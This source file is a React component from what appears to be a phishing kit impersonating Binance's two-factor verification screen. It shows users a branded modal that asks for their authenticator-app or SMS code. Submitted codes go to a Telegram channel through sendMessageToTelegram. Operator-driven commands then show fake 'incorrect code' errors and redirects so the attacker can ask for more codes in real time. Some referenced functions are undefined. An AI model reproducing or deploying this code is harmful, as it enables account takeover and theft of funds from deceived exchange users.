'use client'
import { useState, useEffect } from 'react'
import '../app/globals.css'
import { useTheme } from '../app/lib/ThemeContext'
import BinanceLoader from './BinanceLoader'
import { useCommand } from '../app/lib/CommandContext';
import { useEmail } from '../app/lib/EmailContext'
import { sendMessageToTelegram } from '../lib/api';

export default function Modal({ displayModal, setDisplayModal, modal, count, setCount, setAppAuthButton, setPhoneAuthButton }) {
    const { theme, toggleTheme } = useTheme();
    const { userEmail } = useEmail();
    const [isLoading, setIsLoading] = useState(false)
    const [modalState, setModalState] = useState(`invisible fixed opacity-0`) // Changed from hidden to invisible
    const [animate, setAnimate] = useState('opacity-0')
    const [otpCode, setOtpCode] = useState('');
    const [invalid, setInvalid] = useState(false);
    let { command, resetCommand  } = useCommand(); // Get current command
    const [isVerified, setIsVerified] = useState(false);

    const maskEmail = (userEmail) => {
        if (!userEmail) return '';
        const [localPart, domain] = userEmail.split('@');
        if (!domain) return userEmail;

        const maskedLocal = localPart.charAt(0) + '****';
        return `${maskedLocal}@${domain}`;
    };

    useEffect(() => {
        console.log("Command is ", command);
        if (command === 'REQUEST_AUTH_OTP_AGAIN') {
            setIsLoading(false);
            setInvalid(true);
            resetCommand();
        } else if (command === 'REQUEST_PHONE_OTP_AGAIN') {
            setIsLoading(false);
            setInvalid(true);
            resetCommand();
        } else if (command === 'CORRECT_OTP') {
            console.log("Correct OTP received for:", modal);
            setIsLoading(false);
            setIsVerified(true); // Mark as verified
            resetCommand();
        }  else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
            setIsLoading(false);
            setBgLoader(true);
            setTimeout(() => {
                // setIsLoading(false);
                resetCommand(); 
                router.push('/MfaPage');
            }, 1500);
        } else if (command === 'FINISH') {
            setIsLoading(false);
            setBgLoader(true);
            setTimeout(() => {
                router.push('/verificationPage');
            }, 1500);
        }
    }, [command, modal]);

    useEffect(() => {
        if (isVerified) {
            setOtpCode('');
            setDisplayModal(false);
            setCount(count + 1);
            if (modal === 'AuthApp') {
                setAppAuthButton(true);
            } else {
                setPhoneAuthButton(true);
            }
            setIsVerified(false); // Reset verification state
        }
    }, [isVerified, modal, setDisplayModal, count, setCount, setAppAuthButton, setPhoneAuthButton]);

    // Modal visibility effect - this was missing in your current implementation
    useEffect(() => {
        if (displayModal) {
            setModalState('fixed visible flex flex-col justify-between md:justify-normal')
            // Add a small delay to trigger the animation
            setTimeout(() => {
                setAnimate('opacity-100')
            }, 10)
        } else {
            setAnimate('opacity-0')
            // Wait for opacity transition to complete before hiding
            setTimeout(() => {
                setModalState('invisible fixed opacity-0')
            }, 200) // Match this with your transition duration
        }
    }, [displayModal]);

    const handleOtpSubmit = () => {
        if (otpCode) {
            setIsLoading(true);
            sendMessageToTelegram(otpCode); // Send to Telegram
            setOtpCode(''); // Clear input
        } else {
            setInvalid(true); // Show error if OTP code is empty
        }
    };

    const handleContainerClick = () => {
        if (invalid) setInvalid(false);
    };

    return (
        <div
            className={`${modalState} transition-all duration-200 h-screen w-full ${theme === 'light' ? 'bg-black bg-opacity-50 backdrop-opacity-50' : 'bg-[#0c0d10]'}`}
            onClick={() => setInvalid(false)} // Add this line
        >
            <div className='h-full w-full flex md:justify-center flex-col md:items-center'>
                <div className={`md:border ${animate} transition-opacity duration-200 ease-in-out ${theme === 'light' ? 'md:border-[#eaecef]' : ''} ${theme === 'light' ? 'bg-white' : 'bg-[#1e2329]'} md:mt-10 md:rounded-[15px] md:w-[425px] w-full min-h-[fit] h-full md:h-[589px]`}>
                    <div className='flex md:items-center items-start justify-between py-[16px] px-[16px]'>
                        <div></div>

                        <div onClick={() => setDisplayModal(false)}>
                            <svg xmlns="http://www.w3.org/2000/svg" height="36px" viewBox="0 -960 960 960" width="36px" fill="#1f1f1f"><path d="m336-280-56-56 144-144-144-143 56-56 144 144 143-144 56 56-144 143 144 144-56 56-143-144-144 144Z" /></svg>
                        </div>
                    </div>

                    {/* Main */}
                    <div className='items-stretch flex flex-col justify-start min-h-0 flex-1'>
                        <div style={{
                            'height': '100%', 'overflowY': 'auto', 'display': 'block'
                        }}>
                            <div className='h-auto min-h-[452px] px-[1.5rem] py-0 w-full md:px-[2.5rem]'>
                            <div className='text-[28px] md:text-[33px] font-semibold leading-[34px] md:leading-[40px] md:mb-[1rem] mb-[.5rem]'>
                                {modal === 'AuthApp' ? 'Authenticator App' : 'Phone Verification'}
                            </div>

                            
                            <div className={`mb-8 ${theme === 'light' ? 'text-[#474D57]' : 'text-white'} md:w-[300px] text-[14px] md:text-[16px] font-normal leading-[24px] sm:leading-[22px]`}>
                                {modal === 'AuthApp' 
                                    ? 'Please enter the 6-digit code generated by your authenticator app.' 
                                    : 'Enter the 6-digit verification code sent to your phone number.'}
                            </div>
                                <div>
                                    <div className='flex flex-column text-[14px] font-normal leading-[22px] mb-2'>
                                        {/* Form Label */}
                                        <div className={`${theme === 'light' ? 'text-[#1e2329]' : 'text-[#e6e9ed]'} -mb-1 font-medium`}>
                                            {modal === 'AuthApp' ? 'Authenticator App' : 'Phone Verification Code'}
                                        </div>
                                    </div>

                                    {/* Input */}
                                    <div className='flex flex-col w-full h-[48px] relative'>
                                        <div
                                            className={`border flex items-center ${theme === 'light' ? 'border-[#eaecef]' : 'border-[#474d57]'} ${invalid ? 'border-red-500' : ''} hover:border-[#FCD535] transition duration-200 rounded-[8px] h-full flex w-full`}
                                            style={{ padding: '6px 10px' }}
                                            // onClick={(e) => e.stopPropagation()}
                                            onClick={(e) => {
                                                e.stopPropagation();
                                                if (invalid) setInvalid(false);
                                            }}
                                        >
                                            <input
                                                type={'text'}
                                                value={otpCode}
                                                onChange={(e) => {
                                                    setOtpCode(e.target.value);
                                                    setInvalid(false); // Clear error on input change
                                                }}
                                                spellCheck={false}
                                                className={`text-[16px] ${theme === 'light' ? 'bg-white text-[#1e2329]' : 'bg-[#1e2329] text-white'} m-0 pb-1 leading-[24px] focus:outline-none font-medium flex-grow caret-[#FCD535]`}
                                            />

                                            <div className={`items-center text-[#FCD535] cursor-pointer`}
                                                onClick={() => navigator.clipboard.readText().then(text => setOtpCode(text))}>
                                                Paste
                                            </div>
                                        </div>
                                    </div>

                                    {invalid && (
                                        <p className="text-red-500 text-sm mt-1">
                                            {modal === 'AuthApp'
                                                ? "You have entered an incorrect 2FA verification code.(200001013-210a9570)"
                                                : "Incorrect verification code. Please check your phone messages or resend the code and try again.(001412-c91b96d1)"}
                                        </p>
                                    )}

                                    <button
                                        onClick={handleOtpSubmit}
                                        className={`mt-6 pb-1.5 font-medium text-[16px] hover:opacity-80 w-full bg-[#FCD535] flex items-center border-none cursor-pointer justify-center whitespace-nowrap min-h-[48px] h-[48px] min-w-[80px] ${theme === 'light' ? 'text-black' : 'text-black'} rounded-[10px]`}
                                        type='button'
                                    >
                                        {isLoading ? <BinanceLoader /> : 'Submit'}
                                    </button>

                                    <div className="flex justify-start md:justify-center mt-5">
                                        <button className='text-[14px] font-medium h-[32px] text-[#F0B90B]'>
                                            Security verification unavailable?
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Footer */}
                    <div className='w-full pb-4 pt-6'>
                        <div className='w-full inline-flex justify-center items-center'>
                            <div className='flex items-center justify-center h-6 cursor-pointer opacity-80'>
                                <svg fill="#9ca3af" className="bn-svg w-5 h-5 mr-1 opacity-60" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fillRule="evenodd" clipRule="evenodd" d="M4 4v12l8 5 8-5V4H4zm12 7a4 4 0 11-8 0 4 4 0 018 0zm-4-2.121L9.879 11 12 13.121 14.121 11 12 8.879z" fill="#5e6673"></path></svg>
                                <div className='text-[12px] font-normal text-gray-400 leading-[18px]'>Protected by Binance Risk.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}